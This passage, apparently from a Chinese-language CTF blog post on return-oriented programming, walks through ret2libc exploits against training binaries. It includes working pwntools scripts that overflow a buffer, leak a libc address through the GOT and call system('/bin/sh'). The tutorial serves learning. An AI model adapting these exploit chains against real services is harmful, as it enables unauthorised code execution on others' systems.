binsh_addr])<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="🌰-2-2"><a href="#🌰-2-2" class="headerlink" title="🌰_2:"></a>🌰_2:</h4><p>同样是32位的程序开启NX保护，有一个gets可以利用。有system函数但没有 ‘&#x2F;bin&#x2F;sh’ 字符串，但是有一个gets()函数，我们可以自己读取。同时我们在.bss段发现一个buf可以传参，可以把字符串填在这里</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-44-44.png" srcset="/img/loading.gif" lazyload></p>
+<p>编写exp：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from pwn import *<br><br>r=process(&#x27;/var/run/vmblock-fuse/blockdir/wD0Lp7/ret2libc2&#x27;)<br><br>buf_addr = 0x804A080<br>gets_addr = 0x8048460<br>sys_addr = 0x8048490<br><br>payload = flat( [&#x27;A&#x27;*112, gets_addr, sys_addr, buf_addr, buf_addr] )<br>r.sendline(payload)<br>r.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><br>r.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<p>payload解释：</p>
+<ul>
+<li><code>&#39;A&#39;*112</code>：填充112个字符’A’溢出缓冲区，覆盖返回地址。</li>
+<li><code>gets_addr</code>：将<code>gets</code>函数的地址作为原本程序的gets()函数的返回地址，控制程序流程跳转到<code>gets</code>函数。</li>
+<li><code>sys_addr</code>：<code>system</code>函数的地址，将作为<code>gets</code>函数返回后的下一个地址，控制程序流程跳转到<code>system</code>函数。</li>
+<li><code>buf_addr</code>：缓冲区的地址，作为<code>system</code>函数的参数，传递给<code>system</code>函数的命令字符串所在的内存地址。</li>
+<li><code>buf_addr</code>：再次使用缓冲区的地址，作为<code>gets</code>函数的参数，使得<code>gets</code>函数将用户输入的命令字符串写入到缓冲区。</li>
+</ul>
+<h4 id="🌰-3"><a href="#🌰-3" class="headerlink" title="🌰_3:"></a>🌰_3:</h4><p>这次system也没了🤨，其他的保护和漏洞都和例一例二一样。除此之外，题目中又给了一个 libc.so 动态链接库。</p>
+<p>那怎么得到system的地址呢？</p>
+<p>补课时间到！</p>
+<ul>
+<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，<a target="_blank" rel="noopener" href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li>
+</ul>
+<p>除此之外我们还要知道，A 真实地址 (内存物理地址) - A 偏移地址 &#x3D; B 真实地址 (内存物理地址) -B 偏移地址 &#x3D; 基地址。也就是说，<strong>B的真实地址&#x3D;基地址+B的偏移地址</strong>。</p>
+<p><strong>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</strong></p>
+<p>那该如何获得已知函数的地址呢？</p>
+<p>got表泄露！输出某个函数对应的got表内容，注意libc的延迟绑定机制，got表中只有已经执行过的函数有真实地址，我们需要泄露已经执行过的函数地址。再在程序中查询偏移进一步获得system地址。</p>
+<p>但是！这样太麻烦啦我们可以用工具：<a target="_blank" rel="noopener" href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a> </p>
+<p>exp：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from pwn import *<br><br>sh = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br><br>puts_plt = elf.plt[&#x27;puts&#x27;]<br>got_puts = elf.got[&#x27;puts&#x27;]<br>got_libc_startmain = elf.got[&#x27;__libc_start_main&#x27;]<br>main = elf.symbols[&#x27;main&#x27;]<br><br>payload1 = flat( [b&#x27;A&#x27;*112, puts_plt, main, got_puts] )<br>sh.sendlineafter(&#x27;!?&#x27;, payload1)<br>puts_addr = u32(sh.recv(4))<br><br><span class="hljs-comment"># libc6_2.27-3ubuntu1.2_i386</span><br>libc_puts = 0x67c10 <span class="hljs-comment">#offset</span><br>libc_system = 0x3d250<br>libc_binsh = 0x17e3cf<br><br>libc_base = puts_addr - libc_puts<br>system_addr = libc_base + libc_system<br>binsh_addr = libc_base + libc_binsh<br><br>payload2 = flat( [b&#x27;A&#x27;*112, system_addr, 0xcafebabe, binsh_addr] )<br>sh.sendlineafter(&#x27;!?&#x27;, payload2)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<hr>
+<p>很菜菜的ROP，把笔记收拾收拾发一下。</p>
+<p>本来想说栈上全部东西都搞完再发，但最近github上的绿点点都少了就提前发一部分喽😢</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/pwn/" class="category-chain-item">pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Knowledge/">#Knowledge</a>
+      
+        <a href="/tags/%E6%A0%88/">#栈</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>真的很菜菜的ROP</div>
+      <div>https://shmodifier.github.io/2023/06/21/真的很菜菜的ROP/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Modifier</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年6月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/06/19/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/" title="函数调用约定">
+                        <span class="hidden-mobile">函数调用约定</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    
+    <div class="footer-content">
+       <p> Copyright &copy; 2022&nbsp;-&nbsp;2023 <a href="/">Modifier</a> </p> <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a></p> <!--  <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> -->
+
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
